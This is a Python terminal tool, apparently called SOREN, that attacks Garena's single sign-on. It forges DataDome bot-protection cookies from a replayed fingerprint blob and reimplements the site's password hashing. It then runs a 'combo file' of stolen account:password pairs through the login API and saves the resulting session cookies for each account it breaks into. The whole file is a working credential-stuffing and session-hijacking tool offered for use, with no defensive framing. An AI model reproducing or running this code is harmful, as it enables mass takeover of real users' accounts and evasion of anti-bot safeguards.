import subprocess
import sys
import os
import time

def _install_deps():
    required = ['rich', 'requests', 'pycryptodome']
    missing = []
    for pkg in required:
        try:
            if pkg == 'pycryptodome':
                __import__('Crypto')
            else:
                __import__(pkg)
        except ImportError:
            missing.append(pkg)
    if not missing:
        return
    from rich.console import Console
    from rich.panel import Panel
    from rich.align import Align
    from rich.text import Text
    from rich import box
    console = Console()
    panel = Panel(
        Align.center(Text("⬡  INSTALLING BACKEND  ⬡", style="bold bright_cyan")),
        border_style="bright_cyan",
        box=box.HEAVY,
        padding=(1, 2)
    )
    console.print(Align.center(panel))
    for pkg in missing:
        cmd = [sys.executable, "-m", "pip", "install", pkg, "--quiet", "--no-input"]
        try:
            subprocess.check_call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
    os.execv(sys.executable, [sys.executable] + sys.argv)

_install_deps()

import json
import random
import time
import sys
import signal
import urllib.parse
import requests
import os
import hashlib
from rich.console import Console
from rich.panel import Panel
from rich.align import Align
from rich.text import Text
from rich import box
from rich.prompt import Prompt, IntPrompt
from pathlib import Path
from Crypto.Cipher import AES
import threading

SAND = "#C4B5A0"
CLAY = "#9B8B7A"
SAGE = "#7D8C7A"
STONE = "#B3A58C"
MOSS = "#5E6B5C"
GOLD = "#D4AF37"

OUTPUT_FILE = "fresh_cookie.txt"
FULL_OUTPUT_FILE = "full_session_cookies.txt"
stop_flag = False

console = Console()

def handle_sigint(signum, frame):
    global stop_flag
    stop_flag = True
    print("\n[!] Interrupt received. Stopping.")
    sys.exit(0)

signal.signal(signal.SIGINT, handle_sigint)

def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(plaintext).hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def display_error(error_msg):
    panel = Panel(
        Align.center(Text(error_msg, style="bold red")),
        title="[bold red]SOREN[/bold red]",
        border_style="red",
        box=box.HEAVY,
        padding=(1, 2)
    )
    console.print(Align.center(panel))

def get_datadome_cookie(session, retries=3):
    url = 'https://datadome.garena.com/js/'
    timestamp = int(time.time())
    random_id = random.randint(1000000000, 9999999999)
    JSPL = ('QGQ0BVgjckhG9XFf_olrvPEwB5AKErtjUd6f_dtbCw6uU4mUnl4Ca5uJY9K_OWQfTtT2EcX852pDG2IId4gG5U65OppS7iwx7RfQ1zzKRMro56Xwcuu9Q_K16c69frRlWlLQd-n0p6XgiRXwusJv0AzdM9tBXrKAChlwUPvgd1086UwD5VEdfQXn-_xJN7-6-7Fs2LBt0A7vW4CPF6iCHCIKFJHbFFo8uTxvSdJL69AHKqqrRJ8oQCkfO_GrZiTFCXZAbGwdCqzkFEGFeBGH0RVAG_q7wmiKlII3zlcqZcRgoP2awfU6RjhvIeJToH5rTrby8SGuCZXLAGCG2tcCxraVYDQEL63p5anIGBrdTwdGVE6yL8B4vXNXLTIO0iq0AWjCksq599tQ38RAgo0tMl6cix0pOUwpigTNKY-4eIEEaQ2Cn_Nr9eXTrqRWZOaszlStMIE8M73ErsI_6dLXI5tcohL1NA0k6dPyVhurkMtYjUodgDN0EluJufLMKvH_D6-JT9xIebqCZ2zPv2eOO5wcMC1TyHFjR3NGwpJvD-YghfQUxdmFd3Xcjc41Rcp21CZ2HVsFZME-B8ppZ7AyU3Mn-ETydYWauETEamzkZynKSMKQTys-SrbONsKCbmQiGUxDumBKsPR8ODY87U_QKs3icJeXPheiBv-0w40kMiBU7KLYOrH0wCcGPO4pWS5bl9ju2KF3nMwD5V5AajCqdotm-JU7qAZxJiPAtU9xZmqr-mDQELX56jokfmqkX8v_4YZeAdx0VU96Rpj_-qdvhKpzm9OYZeJI-4VVLhXN200cEumhRfyVp5HZ3pUdUYxgp0ryCydj31kG8dLTDCKTIhMtsUo3bSypcbsE-xdz-P-gUNUYXcTN7uuekhuKwNIeEcTcLdw6udGartLTkTt4SmWxncPDzKwLh6qdhdRVAJIhlbeFY_OeIF4TkCPbGEv9xlN3MJFZccX097QLDT9niyMzxACRar3aPJDzZlaoyyr0asFkNu65-Hfj_XLYlSYET7vC-Sqgzo5016flXcuzKZvMfJp9Jk78GRUtYtVPHEJzMdU0SMcKTp8joR8Y_mmyHIOnoGer4TatyOfNCRF8XOJNdMwp3qSknYp_yfBSUa1Ij3WPtX9lg5kl50YJgNQPovYyCJU_Dwjty_KirEFgbUoOT7yr7w5pJc7yBC2n3wfTxiwmp-RsBwZXlk19UYDiGwWTMA5EfglURLVraue7Df36AEQV5QqBVupNtGpZFwPC5K9YJDG5DIlIMNfIL4X8chGhxCMV6nem-otHDi9JUkcVbTttqrJyXQ50FNfRwUt_ScqwsXVEBD26I-AD6xsdkqmCx60ehJMXiSywNE_Mjt9zG4TUoHKY95gpcXDSvcSVJ6W-rCAQ3M0vcgu5wcdEb1SXmBzUJf_rSJxZoFNPdZjgrQqVBByJKy2V7x4ywPpPPf83z0Y6B7gkW6RS7fUlT47SSjvtkXGYoRLn9zDcOtvX1TxxUXrDjw4H9T5n7zOy5Eao7BQ9fcDgZ1pyYH6soR9Ug2MsOX5cHCH5LMC7qZtDW0aFKLD76LNMcZfWxn_tiadU3JynnXwkZ8B70leGLWoe9azUJY0F_xgD6tgCKf1xxJQAtcuUU1PTHG_kIFhD_UrZiq4DKhIMZgvkSgwEvpYmHOnpRZMoqOn2T81bwz1jhDq3H0YJClW2y0Bzk_cvMEZOb05kS3cHr0fcVGnLkqxGWWsT9YVRbNueDhbZIoPfdiOpqn9ZTOpxKFxwEuEeKaPSfb6A7PUAHREieN9hpCdlmZwygPw3sHpK0jdD-hKUTiG3d-xOr2Tc9-QVtSy_mdR_rSdMDvXEJsVZJ33f6SaKsnsElaLd2vB8YZfUaTksujLUBqgxd4gSKUdcEZ-_-8huvk9MJFsw37KqHYVCCmdHzJe_KjC6GZx4UGskD1amFPKYTp7Q4H9U-RIflTDX3K8Pxced7Kx4W-7tDt8V5wj6ggRDK_wAZ_8fxpjrH7PhEyTTeJxB_bJ2Sigbjoi368mAoudRMkiChN66D8xap_nYUCtBkdFDZpThAv04leKOllua60DS5W1KL91x9CYMPmKQUWMHFVY6MqPaUsecHxDK1WujPkCnSGKpr0iiEHNpbC_5atdvXmS2dVjyih1fXxpnwW5-uyybBQKkhWXcI6HXC5ic6J4sBra17lvvBfff4sAw_FohvjPwNUCW4fUKz8qrLXYWuhTtsgzCdwXKnNbAJHFg5RPiAR3sDj6eIPJlRSv3foRh656t3015JAetowe7J2l7a_UBRmkQmZerVBEh8LCgU_BqE1Kz4ibHWHBPcBSRZVzCmfUXVUWWaYfAtBUIkz4n0TNDf3MjhksOpda2sKiJ97w7lZDPA_46hiFhfM6SP8y9GV7ToaXGxY-rsDGKxUXvCmk73l5YbxfaHfGhMpKxsSCaj40MFKyCNydU7Wn9Eha1bNW0CdenKkrTcJgpfgHkOKSjIFJMJzElcE1TWTYWxlqJqKHnMw9GmQFPe0JiYSf_NWtU2AFv7cjqCeYU6EOWN6yNMPCpIKHapVzCpwSxVmdywJYwFpte2kcu0RDICFHL1_ocSPF83azDEAcyb2sK6hu5WBR9mB-KGKnBzkktfo7TSvrq05d6jQInG3jxnFULmdvyUhIf7Wh9PoO48psknM85XQ3gCMMUlqyBw0TcsGaik-DLyFnoWo2bQW9vpPhmxO_wtQ6YBfQpIRsJlDexBaLWFX7KpWOr4wgX-0jviPLsXOGSWUQ-e6PxflfbEOB6hYdBL7uJhRO7QA8wsLvnUUxdLY7mxqzCJF2_l_O2a_Sdw7MId_KjEerVYj0VHm9svX7RdrrnS2DzbXyXzRGOy8l6OzQoDUAQRfyV2mjZgpYPxQry2G3P538x4zw-k_JNsy39rhjM0-uCTQ1d7YapQx3W20R3CxSPgk4tiu7sIKQxs-QpnHTKetaGW4MJEreDRZ_h8_oukyvaFPpItE9Yc8SIt1T-2RkAnDNXBA-g287V6lo6v_nNh7mGYC3Lx4qeG26aAsR3oX9SiSCuAp8Lyahw4Q2yPo4NTvsxLuY_b7SzMybfyQVXOCzHRx9VrQXWrTQ3iFvC1o49YQdta8tG1SA15bvhD5IpVcHi6HduW7SEll7Uk1l6hvg8GwwkDSsAqXa7Rsu7g5GL_hI-GaAP1R7VK3iD_TXLAnRoETWh56dMqw4l_QqKCggCA-WSj3WKIXcDnuTtnZragribanEi7_F_DL2q0OHuD1KqzY7c8eouznfNmOHASe_GwrcIVMr-XT1Rf5huXlnQ1l8eqgqQR1oQkc_K3ihzMJM8L_Vhd0_KLR4-1ICSL1QdOSboLjH2nVuzc7je6FyRyNOUBSZU1sT5caMBnNllX4FRwduqGSje9X6XY8a5vYd5Kpgp3AyrPv8gVLExQguIGFa-4IbLmjsM1B6UEj4VTcFM8RJ221_n3KuVDl5X-_g2rW3GHP8zUPlkYOmlJ5Z0GQ8ubDGe14nAAA9H-Rop4TaNFkMup3EOr3Ec6_GvPxzET3lcdP9qF6FdYmY9Ejhr18yGFZfDf3w3y_K7PRfRkEsdliiCSvYosgssIs8jB2VzL3HEbwwjCz_aKZT0W9NYkBxAi8cZf676phGbEJ50hoYRSIwJJU8Tu0A0hrUnkvw3Woc-88SWO4ZlpAxUZXiuFtfhQxbO1SXxByBTaWdJ9GkxriyF0zg8TQeOoZFi5ad-FLPfriP1DitrrITsJKPN-hpORrNd0yjGf9D_-9vD4Mvm8IzkEbzNpX4VHVhrwFLlpk6aeME9q01T-CX5PqmkoVk4cZihcoQe-i96Mcy-umgshZdAyxckIjGFv_vWQYxghUwNTMOotHXbx58RJQQ8QY2FoSyVbTpUXM7yL8_xLT5mh4N_qx66Gpw0t7mSUDSIB992q3vugspQWO2UKy1j5gw8UzlmgYvNTOcR5pRav6Zp-we0685y8IdrKbwH0dm6ZnSSmAlw0WD-YveLDEWJgcFYE94fkZ83czXgJb7I-JrLiyHk7K7aSmXkII-60Fm1ksQayHbJsvnzmXzbaWtp2tgCmM1hqahSnXN_eaUTaDumK9-e-iobjOXcYPERFwssEA_zrRvXFdoiINmqtwVi4so7quVBEMsjyOPsN4WjfgJo39il-yBMVlpBYMxZjZrzoxBU6RaNq3Vn2xz9PTIUnpqFm1V2wAdH-gJNvravSZxWRd8e2ub5SMBJEddGHZMmY2oaxlI1XgsNg9FLFm78WqOP3oqvjpoNPAUeKu6IbDRtuwKEZEQjBCYrih9zELsUYUD2vDr9r4JxSY2_SRx1Istk-z6cm6blTyybiBsrT3t-uULM4VHKBQGcOKF10aeZJkvclKSxI-kUIu97evHkFKcXG6mWRGXt0rzkPCzm12Dm6dLdkS1p4nQGGmlxNf913DXotB7EsBc62ddIO7O1KJTWRCIxBnFmVl2smSMkZ34xaqLcoM17k9zqA8RMYUpUjfnIjhCQCNtRpdJvVsyFVLujlhgBnkNg5ev27PYGgHzEQHeDsNOAMJOf-lzxKn8stzPJp0OjpCNsWcYW6NhbgwnS4y4zzsjGNWSSO8MFpeG-5v2B2ASKsex0TGFmRSsZIP6N_2nJP28QWQEDWL08qKJ1TyrR7P-XbpOm8UmHb2beK56hMHafXmISVakfP0dS3Oh224nYa6QMn8yYiNgvzDKik4bHHiIftnLcCaRZC8FIiioBnj69Ya0tWe0aXwgkNDiTj8ko60jsSFA6x0Y9uAQupjTGjAXkIUGRbfSa-h3qYe4dPiDb0OwpUM7beqkblKvbqNBqy8So5F8MPNaDAS7L0syTp2ugVvp0iwZCAB-4xWJqyToyzNJVrGU9K8jlX7qbh7d7NwqohBq1UT_wEjl2C4Vk1domhlfZeaUPfpMAwTMSLlogvpqsr5dcygjtcH2RL0xvorT9RItWdExi0ZEgZYR2e16sctZHqJdmHDLrcgfxHXV9XpX3I0M20fJe2yV1w5m_Kl5EDs72f8JcrKNvTgCGRa1Jmxu_3yXcWJ1hQSBFauGi6dXnBFk87FUjIewCpy6744anPrNjdBW9zZPAUN4t2E3ehNZKxRddzl9sGlUYR6xkDaKXCthj1sAwjuLfwrYaynulYXCzH9BymnYqWrBGEKQ6SP5OR7uxPfQVRnDPFqXP1kfZlwTNPcDGXUb-EWVxR9w7H6QVPTROp9nkdf_SSQ3u88x1gnD_SVwfwsIh9NXt1L-JidK1DEV2I72FcTxVH4sM4Ch8q8i6x1_Soo6CGnXNKFGUZE2xg8jo2G8O_pwSbOTULG5dXtt_4nFyCWsRhDeFBn7bvguKg0sl4cBHkD_Li8rN-3H8hFw137Q3N2v39DEXGfJEB0et2PX-4r1gVA7qqUHUcNwdvy6ZOcRQg_NYvGgcGWoQde5eAHIQ0avvSQGUHFEUb6NuiiOcKoDXipJtsbNi2UR3pIhfr8YsFQTqdz3NF2zo9IEvY0uds1VowMJAIBF001MlYmMQ3iAVutCrJnMehTpDFZztqzUJ917m72Snc2NA2LSPObaq5M6wiPpLnscG1yCJlVo52xazMfcn3jeRg-RoOAK-mHBSQ-W7oD')
    payload = {
        'jspl': JSPL,
        'eventCounters': '{"mousemove":4,"pointermove":1,"click":4,"scroll":0,"touchstart":4,"touchend":4,"touchmove":0,"keydown":2,"keyup":2}',
        'jsType': 'le',
        'cid': 'ROxC_oAlhyCRnDuIxNT_gKAsk8IOlYBFcrRuxfab_kt77Rrbyhu8xH21Zm6rN1hshR8R1vYl6Mlq8rC8fFRV7M9NV8EwyGm_EF0dY2yiLhcSRRttpELcrtVbTtmEMGG2',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https%3A%2F%2Fsso.garena.com%2Funiversal%2Flogin%3Fapp_id%3D10100%26redirect_uri%3Dhttps%253A%252F%252Faccount.garena.com%252F%26locale%3Den-PH',
        'request': '%2Funiversal%2Flogin%3Fapp_id%3D10100%26redirect_uri%3Dhttps%253A%252F%252Faccount.garena.com%252F%26locale%3Den-PH',
        'responsePage': 'origin',
        'ddv': '5.8.0'
    }
    headers = {
        'content-length': '6374',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-mobile': '?1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'accept': '*/*',
        'origin': 'https://sso.garena.com',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://sso.garena.com/',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-PH,en-US;q=0.9,en;q=0.8',
        'cookie': f'_ga_1M7M9L6VPX=GS2.1.s{timestamp}$o21$g1$t{timestamp}$j53$l0$h0; _ga=GA1.1.{random_id}.{timestamp}'
    }
    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())

    for attempt in range(retries):
        try:
            response = session.post(url, headers=headers, data=data, timeout=30)
            if response.status_code != 200:
                return None, f"HTTP {response.status_code} from DataDome"
            try:
                response_json = response.json()
            except json.JSONDecodeError:
                return None, "Invalid JSON response from DataDome"
            if response_json.get('status') != 200:
                return None, f"API status {response_json.get('status')}"
            if 'cookie' not in response_json:
                return None, "Garena breach system failed"
            cookie_string = response_json['cookie']
            if '=' in cookie_string and ';' in cookie_string:
                return cookie_string.split(';')[0].split('=')[1], None
            else:
                return cookie_string, None
        except requests.exceptions.Timeout:
            return None, "Request timeout (30s)"
        except requests.exceptions.ConnectionError as e:
            msg = str(e)
            if 'Name or service not known' in msg or 'gaierror' in msg:
                return None, "DNS resolution failed – check your internet or VPN"
            elif 'refused' in msg:
                return None, "Connection refused – server may be down or firewall blocking"
            else:
                return None, f"Connection error: {msg[:80]}"
        except Exception as e:
            if attempt < retries - 1:
                time.sleep(0.5)
                continue
            return None, f"Unknown error: {str(e)[:80]}"
    return None, "Retries exhausted – no response from DataDome"

def prelogin(session, account, retries=3):
    for attempt in range(retries):
        try:
            url = 'https://sso.garena.com/api/prelogin'
            params = {'app_id': '10100', 'account': account, 'format': 'json', 'id': str(int(time.time() * 1000))}
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key', '_ga', '_ga_XB5PSHEQB4', '_ga_1M7M9L6VPX']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f'{cookie_name}={current_cookies[cookie_name]}')
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''

            headers = {
                'Host': 'sso.garena.com',
                'Connection': 'keep-alive',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'Accept': 'application/json, text/plain, */*',
                'sec-ch-ua-mobile': '?1',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                'sec-ch-ua-platform': '"Android"',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-PH',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-PH,en-US;q=0.9,en;q=0.8'
            }
            if cookie_header:
                headers['cookie'] = cookie_header

            response = session.get(url, headers=headers, params=params, timeout=30)

            status = response.status_code
            if status == 403:
                return (None, None, 403)
            if status == 429:
                time.sleep(3)
                continue
            if status != 200:
                return (None, None, status)

            try:
                data = response.json()
            except:
                return (None, None, 200)

            if 'error' in data:
                return (None, None, 200)

            v1, v2 = data.get('v1'), data.get('v2')
            if not v1 or not v2:
                return (None, None, 200)

            return (v1, v2, 200)

        except:
            if attempt < retries - 1:
                time.sleep(1)
                continue
    return (None, None, 0)

def login(session, account, password, v1, v2):
    hashed_password = hash_password(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    params = {
        'app_id': '10100',
        'account': account,
        'password': hashed_password,
        'redirect_uri': 'https://account.garena.com/',
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    current_cookies = session.cookies.get_dict()
    cookie_parts = []
    for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
        if cookie_name in current_cookies:
            cookie_parts.append(f'{cookie_name}={current_cookies[cookie_name]}')
    cookie_header = '; '.join(cookie_parts) if cookie_parts else ''

    headers = {
        'accept': 'application/json, text/plain, */*',
        'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
    }
    if cookie_header:
        headers['cookie'] = cookie_header

    retries = 5
    for attempt in range(retries):
        try:
            response = session.get(url, headers=headers, params=params, timeout=30)
            response.raise_for_status()

            login_cookies = {}
            if 'set-cookie' in response.headers:
                for cookie_str in response.headers['set-cookie'].split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                login_cookies[cookie_name] = cookie_value
                        except:
                            pass
            for k, v in response.cookies.get_dict().items():
                if k not in login_cookies:
                    login_cookies[k] = v
            for k, v in login_cookies.items():
                if k in ['sso_key', 'apple_state_key', 'datadome', 'token_session', 'ac_session', 'session_key']:
                    session.cookies.set(k, v, domain='.garena.com')

            data = response.json()
            if 'error' in data:
                error_msg = data['error']
                if error_msg in ('ACCOUNT DOESNT EXIST', 'error_no_account', 'error_auth', 'error_user_ban', 'error_security_ban'):
                    return f'permanent_fail:{error_msg}'
                if attempt < retries - 1:
                    time.sleep(1)
                    continue
                return None
            sso_key = login_cookies.get('sso_key') or response.cookies.get('sso_key')
            return sso_key
        except:
            if attempt < retries - 1:
                time.sleep(1)
                continue
    return None

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_my_ip_info():
    try:
        resp = requests.get('http://ip-api.com/json/', timeout=8)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('status') == 'success':
                return {
                    'ip': data.get('query', 'Unknown'),
                    'country': data.get('country', 'Unknown'),
                    'region': data.get('regionName', 'Unknown'),
                    'city': data.get('city', 'Unknown'),
                    'isp': data.get('isp', 'Unknown'),
                    'asn': data.get('as', 'Unknown'),
                    'timezone': data.get('timezone', 'Unknown')
                }
    except:
        pass
    return None

def show_ip_info_box():
    info = get_my_ip_info()
    if info:
        lines = [
            f"🌐 IP Address   : {info['ip']}",
            f"📍 Location     : {info['country']}, {info['region']}, {info['city']}",
            f"🏢 ISP          : {info['isp']}",
            f"🔢 ASN          : {info['asn']}",
            f"🕒 Timezone     : {info['timezone']}"
        ]
        panel = Panel(
            "\n".join(lines),
            title="[bold]🌍 YOUR CURRENT NETWORK INFO[/bold]",
            border_style=CLAY,
            box=box.HEAVY,
            padding=(1, 2)
        )
        console.print(Align.center(panel))
    else:
        console.print(Align.center(Panel("[yellow]Could not fetch IP info.[/yellow]", border_style=CLAY, box=box.HEAVY)))

def print_banner():
    clear_screen()
    banner = r"""
 ███████╗ ██████╗ ██████╗ ███████╗███╗   ██╗
 ██╔════╝██╔═══██╗██╔══██╗██╔════╝████╗  ██║
 ███████╗██║   ██║██████╔╝█████╗  ██╔██╗ ██║
 ╚════██║██║   ██║██╔══██╗██╔══╝  ██║╚██╗██║
 ███████║╚██████╔╝██║  ██║███████╗██║ ╚████║
 ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝
"""
    console.print(Align.center(Text(banner, style=f"bold {SAND}")))

def display_cookie(cookie, index=None):
    title = f"DATADOME #{index}" if index is not None else "DATADOME"
    panel = Panel(
        Align.center(Text(cookie, style="bold white")),
        title=f"[bold]{title}[/bold]",
        border_style=CLAY,
        box=box.HEAVY,
        padding=(1, 2)
    )
    console.print(Align.center(panel))

def generate_cookies_loop(session):
    console.print(Align.center(Panel("[bold]Generating datadome cookies continuously. Press Ctrl+C to stop.[/bold]", border_style=CLAY, box=box.HEAVY)))
    count = 0
    while not stop_flag:
        cookie, err = get_datadome_cookie(session)
        if cookie:
            with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
                f.write('datadome=' + cookie + '\n')
            count += 1
            display_cookie(cookie, count)
        else:
            display_error(err)
        time.sleep(0.1)
    console.print(Align.center(Panel(f"[green]Generated {count} cookies saved to {OUTPUT_FILE}[/green]", border_style=MOSS, box=box.HEAVY)))

def generate_full_session_cookies(combo_file):
    if not combo_file:
        combo_file = Prompt.ask(f"[{SAND}]Enter combo file path (or leave blank for manual)[/{SAND}]", default="")
        if not combo_file:
            account = Prompt.ask(f"[{SAND}]Enter account (email/username)[/{SAND}]")
            password = Prompt.ask(f"[{SAND}]Enter password[/{SAND}]", password=True)
            session = requests.Session()
            dd, err = get_datadome_cookie(session)
            if not dd:
                display_error(f"No datadome: {err}")
                return
            session.cookies.set('datadome', dd, domain='.garena.com')
            v1, v2, status = prelogin(session, account)
            if status == 403 or not v1 or not v2:
                display_error("Prelogin failed – check datadome or account.")
                return
            sso_key = login(session, account, password, v1, v2)
            if not sso_key or sso_key.startswith('permanent_fail:'):
                display_error("Login failed.")
                return
            cookie_parts = [f"{k}={v}" for k, v in session.cookies.get_dict().items() if k in ['datadome','sso_key','token_session','ac_session','session_key']]
            if cookie_parts:
                full_cookie = '; '.join(cookie_parts)
                with open(FULL_OUTPUT_FILE, 'a', encoding='utf-8') as f:
                    f.write(full_cookie + '\n')
                console.print(f"[green]Saved: {full_cookie}[/green]")
            return

    try:
        with open(combo_file, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f if line.strip() and ':' in line]
    except:
        display_error("Could not read combo file.")
        return
    if not lines:
        display_error("No valid account:password lines.")
        return
    console.print(f"[cyan]Loaded {len(lines)} combos.[/cyan]")

    for idx, line in enumerate(lines, 1):
        if stop_flag:
            break
        account, password = line.split(':', 1)
        account, password = account.strip(), password.strip()
        console.print(f"[bold]Processing {idx}/{len(lines)}: {account}...[/bold]")

        session = requests.Session()
        datadome, err = get_datadome_cookie(session)
        if not datadome:
            display_error(f"Failed to get datadome: {err}")
            continue
        session.cookies.set('datadome', datadome, domain='.garena.com')

        v1, v2, status = prelogin(session, account)
        if status == 403 or not v1 or not v2:
            display_error("Prelogin failed – account may not exist or IP blocked.")
            continue

        sso_key = login(session, account, password, v1, v2)
        if not sso_key or sso_key.startswith('permanent_fail:'):
            display_error("Login failed – invalid credentials.")
            continue

        cookie_dict = session.cookies.get_dict()
        cookie_parts = [f"{k}={cookie_dict[k]}" for k in ['datadome','sso_key','token_session','ac_session','session_key'] if k in cookie_dict]
        if cookie_parts:
            full_cookie = '; '.join(cookie_parts)
            with open(FULL_OUTPUT_FILE, 'a', encoding='utf-8') as f:
                f.write(full_cookie + '\n')
            console.print("[green]✔ Full session cookie saved.[/green]")
        else:
            display_error("No session cookies found.")

    console.print(f"[green]Finished processing {len(lines)} accounts. Results in {FULL_OUTPUT_FILE}[/green]")

def main():
    session = requests.Session()
    while True:
        print_banner()
        show_ip_info_box()
        console.print(Align.center("─" * 50, style=STONE))

        menu_panel = Panel(
            Align.center(
                "[bold]OPERATION MODE[/bold]\n\n"
                "[1] Generate DataDome\n"
                "[2] Generate Full Session Cookies\n"
                "[3] Exit Application"
            ),
            title="[bold]MENU[/bold]",
            border_style=CLAY,
            box=box.HEAVY,
            padding=(1, 4)
        )

        console.print(Align.center(menu_panel))

        reminder_panel = Panel(
            Align.center(
                "[bold yellow]Reminder[/bold yellow]\n\n"
                "Press [bold]Ctrl + C[/bold] at any time to safely stop."
            ),
            title="[bold]NOTICE[/bold]",
            border_style=SAND,
            box=box.ROUNDED,
            padding=(0, 2)
        )

        console.print(Align.center(reminder_panel))

        choice = Prompt.ask(
            f"[{SAND}]Select an option (1/2/3)[/{SAND}]",
            default="1"
        )

        if choice == '3':
            console.print(
                Align.center(
                    Text("Thank you and Goodbye! 🫶👋", style=f"bold {SAND}")
                )
            )
            sys.exit(0)

        if choice == '1':
            generate_cookies_loop(session)
        elif choice == '2':
            combo_file = Prompt.ask(f"[{SAND}]Enter combo file path (or leave blank for manual entry)[/{SAND}]", default="")
            if combo_file and Path(combo_file).exists():
                generate_full_session_cookies(combo_file)
            else:
                generate_full_session_cookies(None)
        else:
            console.print("[red]Invalid choice.[/red]")

        console.print("\n[bold yellow]Press Enter to continue...[/bold yellow]")
        input()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print(
            "\n[bold red]Interrupted. Exiting...[/bold red]"
        )
        sys.exit(0)